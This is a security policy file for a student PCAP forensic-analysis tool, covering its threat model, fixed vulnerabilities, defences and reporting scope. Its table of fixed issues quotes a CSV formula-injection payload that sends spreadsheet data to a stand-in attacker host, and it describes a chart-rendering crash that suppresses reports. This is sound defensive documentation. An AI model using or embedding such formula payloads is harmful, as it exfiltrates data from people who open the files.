# Security Policy

## What this project is

A learning and portfolio project for automated PCAP/PCAPNG forensic analysis. It is written with production-oriented practices and is tested, but it has not been through an independent security assessment and is **not** a hardened commercial product. Treat its output as analyst input, not as a verdict.

## The threat model that actually matters here

The most important thing to understand about this tool: **the capture file is untrusted input.**

Someone whose traffic is being captured controls DNS query names, domain names, packet contents, and IP/port values. All of that flows into the findings and then into the HTML report, the JSON/CSV exports and the PDF. The person at risk is the **analyst** who opens those artifacts, not the machine that produced the traffic.

Concrete attacks in this class that have already been found and fixed (see `git log`):

| Vector | What it did |
| --- | --- |
| CSV formula injection (CWE-1236) | A threat-intel provider tag such as `=HYPERLINK("https://evil.tld/?d="&A1,"Open")` executed when the analyst opened the CSV in Excel |
| matplotlib mathtext | A hostname containing `$$` raised `ValueError` during chart rendering, so **no report was produced at all** — an attacker could suppress the forensic artifact for their own traffic |

Both are covered by regression tests, including one that builds a real hostile capture and runs the whole pipeline over it (`tests/test_main.py::test_hostile_capture_produces_all_outputs_without_active_payloads`).

Defences currently in place: Jinja2 autoescaping for the HTML report, `xml.sax.saxutils.escape` on every PDF paragraph built from capture data, formula neutralisation at the single CSV write choke point, mathtext parsing disabled globally, no `eval`/`exec`/`pickle`/`shell=True` anywhere, and a non-root container user.

## Reporting a vulnerability

Please open a **[GitHub security advisory](https://github.com/salihogz/automated-pcap-forensic/security/advisories/new)** rather than a public issue, so the problem can be fixed before it is described publicly.

Useful things to include: the affected file and line, a capture (or a script that generates one) that triggers it, and what an attacker gains. A proof-of-concept `.pcapng` is the fastest possible way to get something fixed.

I am a student and this is not a funded project, so please do not expect a same-day response — but every report will be answered.

## In scope

- Anything where a crafted **capture file** causes code execution, file writes outside `reports/`, or content that becomes active when an artifact is opened (HTML, CSV, PDF)
- Anything where a malicious or compromised **threat-intel API response** does the same
- Leakage of API keys into logs, reports, exports, or the container image

## Out of scope

- Memory exhaustion on very large captures. This is known, measured and documented in the README; the tool warns and continues rather than refusing evidence, which is a deliberate choice for a forensic tool.
- Detection accuracy — a rule missing an attack, or producing a false positive, is a bug but not a vulnerability. Please open a normal issue for those.
- Vulnerabilities in third-party dependencies. `pip-audit` runs in CI on every push; report those upstream.
- Anything requiring the attacker to already control the machine running the analysis.
